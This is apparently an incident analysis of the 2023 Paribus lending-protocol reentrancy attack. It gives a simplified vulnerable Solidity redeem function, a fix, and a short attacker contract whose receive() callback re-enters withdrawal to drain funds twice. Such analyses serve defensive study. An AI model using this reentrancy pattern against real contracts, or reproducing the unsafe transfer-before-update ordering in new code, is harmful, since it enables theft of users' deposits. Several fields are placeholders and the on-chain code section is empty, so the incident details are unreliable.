# Paribus — Lending Protocol Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-04-16 |
| **Protocol** | Paribus |
| **Chain** | Ethereum |
| **Loss** | Unknown |
| **Attacker** | Unknown |
| **Attack Tx** | Ethereum Transaction |
| **Vulnerable Contract** | Paribus Lending Contract |
| **Root Cause** | Missing reentrancy protection in the lending protocol's collateral withdrawal flow |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/Paribus_exp.sol) |

---
## 1. Vulnerability Overview

Paribus is a lending protocol forked from Compound. Due to missing reentrancy protection during collateral withdrawal and loan repayment, an attacker was able to re-invoke the same function via an external call and execute a double withdrawal.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable redeem function (Compound cToken pattern)
function redeemUnderlying(uint redeemAmount) external returns (uint) {
    // ❌ External token transfer before state update
    doTransferOut(msg.sender, redeemAmount);
    // ETH transfer triggers receive() callback → reentrancy possible

    // State update (too late)
    totalCash -= redeemAmount;
    // ❌ On reentry, totalCash has not yet been decremented
}

// ✅ Fix
function redeemUnderlying(uint redeemAmount) external nonReentrant returns (uint) {
    totalCash -= redeemAmount;  // ✅ State update first
    doTransferOut(msg.sender, redeemAmount);
}
```

### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Missing reentrancy protection in the lending protocol's collateral withdrawal flow
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker Contract → redeemUnderlying() → ETH transfer → receive() → Reentrancy → Duplicate withdrawal
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function attack() external {
    // 1. Deposit collateral
    paribus.mint{value: depositAmount}();

    // 2. Initiate reentrancy attack
    paribus.redeemUnderlying(depositAmount);
}

receive() external payable {
    // Reenter on ETH receipt
    if (address(paribus).balance >= depositAmount) {
        paribus.redeemUnderlying(depositAmount);  // Duplicate withdrawal
    }
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy Attack |
| **Attack Vector** | ETH transfer callback + reentrancy |
| **DASP Classification** | Reentrancy |
| **CWE** | CWE-841 |

## 6. Remediation Recommendations
Apply `nonReentrant` modifier, follow the CEI (Checks-Effects-Interactions) pattern, update state before ETH transfer.

## 7. Lessons Learned
Compound forks must inherit reentrancy protection patterns as-is. When modifying upstream code, it is essential to verify that security properties are preserved.